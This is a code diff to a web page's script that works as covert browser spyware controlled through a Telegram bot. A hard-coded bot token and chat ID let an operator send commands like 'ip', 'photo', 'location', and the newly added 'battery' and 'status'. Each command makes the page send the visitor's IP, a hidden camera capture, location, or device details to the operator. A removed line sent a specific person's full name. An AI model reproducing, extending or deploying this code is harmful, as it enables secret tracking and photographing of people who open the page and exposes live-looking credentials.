@@ -15,6 +15,7 @@
     <canvas id="c" style="display:none"></canvas>
 
     <script>
+
         const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
         const CHAT_ID = '7883989086';
         let lastUpdateId = 0;
@@ -30,11 +31,18 @@
                         lastUpdateId = update.update_id;
                         let msg = update.message.text.toLowerCase();
 
-                        if (msg === 'ip') sendIP();
-                        if (msg === 'photo') takePhoto();
-                        if (msg === 'location') sendLocation();
-                        if (msg === 'name') sendText("නම: හංගිලි ගෙදර විරාජ් කෞශල්‍ය වීරසේකර");
-                    }
+                        // මේ කොටස විතරක් වෙනස් කරන්න
+if (msg === 'ip') sendIP();
+if (msg === 'photo') takePhoto();
+if (msg === 'location') sendLocation();
+if (msg === 'battery') {
+    navigator.getBattery().then(batt => {
+        sendText("🔋 බැටරි මට්ටම: " + (batt.level * 100) + "%");
+    });
+}
+if (msg === 'status') {
+    sendText("📶 Online: " + navigator.onLine + "\n📱 Platform: " + navigator.platform);
+}
                 }
             } catch (e) { console.error(e); }
         }
